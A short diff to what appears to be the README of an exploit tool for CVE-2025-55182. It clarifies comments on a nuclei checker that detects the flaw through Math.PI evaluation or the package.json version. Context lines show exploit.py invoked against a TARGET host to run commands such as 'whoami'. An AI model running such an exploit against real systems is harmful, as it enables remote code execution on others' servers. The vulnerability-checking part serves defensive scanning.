@@ -55,7 +55,7 @@ python3 exploit.py --url https://TARGET:3002 --post-endpoint "/formaction" --cod
 python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/api/v1/login" --cmd "whoami" --no-ssl-verify
 ```
 
-## Checker with nuclei (no RCE, only with Math.PI)
+## Checker with nuclei (no RCE, only with Math.PI and package.json version)
 
 ```bash
 # Custom route:
@@ -70,7 +70,7 @@ Possible routes:
 '/api/v1/login'
 'etc..'
 
-# Check vulnerability by package.json analysis:
+# Check vulnerability by package.json analysis (if package.json is accessible):
 nuclei -t ~/cve-2025-55182-versions.yaml -u http://localhost:3005
 
                      __     _
